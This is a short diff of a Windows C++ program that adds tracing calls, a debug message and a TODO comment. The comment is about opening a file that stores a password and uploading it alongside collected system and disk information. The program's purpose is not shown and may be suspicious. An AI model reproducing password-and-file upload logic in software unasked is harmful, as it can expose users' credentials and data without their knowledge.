@@ -145,6 +145,7 @@ Cleanup:
 
 int _tmain(int argc, _TCHAR* argv[])
 {
+	InitTrace();
 	WSADATA ws;
 	WSAStartup(MAKEWORD(2, 2), &ws);
 	curl_global_init(CURL_GLOBAL_SSL);
@@ -173,6 +174,7 @@ int _tmain(int argc, _TCHAR* argv[])
 			Trace(0); // moves to submit
 
 			// upload all files
+			//TODO open file which store the password. If it's not there it means that it was never run so there is no file to upload
 			SysInfo info;
 			QuerySystemInfo(info);
 			char szHdd[MAX_PATH] = { 0 };
@@ -216,6 +218,7 @@ int _tmain(int argc, _TCHAR* argv[])
 		}
 		else if (!_tcsicmp(L"test", argv[1] + 1))
 		{
+			Debug("[FRA] Requesting a test. Guess who's launching it");
 			if (!_tcsicmp(L"download", argv[2]))
 				testDownload();
 			if (!_tcsicmp(L"comm", argv[2]))
